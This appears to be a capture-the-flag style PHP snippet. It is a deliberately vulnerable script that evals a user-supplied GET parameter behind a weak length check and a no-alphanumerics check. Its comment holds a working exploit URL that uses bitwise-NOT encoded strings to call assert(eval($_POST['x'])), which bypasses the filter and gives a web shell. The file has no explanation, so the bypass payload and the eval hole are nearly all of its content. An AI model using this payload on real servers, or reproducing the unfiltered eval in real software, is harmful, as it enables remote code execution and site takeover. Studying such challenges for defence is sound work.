// http://target.com/noalphanumeric.php?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%87%DD%A2%D6%D6);
<?php
$code = $_GET['code'];
if(strlen($code)>40){
    die("longlong...");
}
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("bad char.");
}
eval($code);
?>
